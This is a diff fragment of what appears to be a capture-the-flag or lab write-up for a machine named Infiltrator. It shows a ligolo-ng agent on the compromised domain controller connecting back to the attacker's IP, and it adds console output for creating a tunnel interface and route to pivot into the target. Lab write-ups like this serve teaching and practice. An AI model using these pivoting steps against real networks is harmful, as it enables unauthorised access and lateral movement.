@@ -601,7 +601,26 @@ evil-winrm-py PS C:\Temp> .\agent.exe -connect 10.10.14.61:11601 --retry --ignor
 Then on the target ill send the connection back to me
 
 ```python
-
+ligolo-ng » INFO[0008] Agent joined.                                 id=a2dead8cd5a9 name="INFILTRATOR\\M.harris@dc01" remote="10.129.232.99:61019"
+ligolo-ng » 
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - INFILTRATOR\M.harris@dc01 - 10.129.232.99:61019 - a2dead8cd5a9
+[Agent : INFILTRATOR\M.harris@dc01] » 
+[Agent : INFILTRATOR\M.harris@dc01] » 
+[Agent : INFILTRATOR\M.harris@dc01] » 
+[Agent : INFILTRATOR\M.harris@dc01] » ifcreate --name ligolo
+INFO[0068] Creating a new ligolo interface...           
+INFO[0068] Interface created!                           
+[Agent : INFILTRATOR\M.harris@dc01] » route_add --name ligolo --route 240.0.0.1/32
+INFO[0079] Route created.                               
+[Agent : INFILTRATOR\M.harris@dc01] » tunnel_start 
+INFO[0089] Starting tunnel to INFILTRATOR\M.harris@dc01 (a2dead8cd5a9) 
+[Agent : INFILTRATOR\M.harris@dc01] »  
 ```
+
+Then on my proxy ill select the new session, add a new interface and add the routing info and the start the tunnel
+
+> `240.0.0.1/32` is a special address used in ligolo-ng that is reserveed
 
 
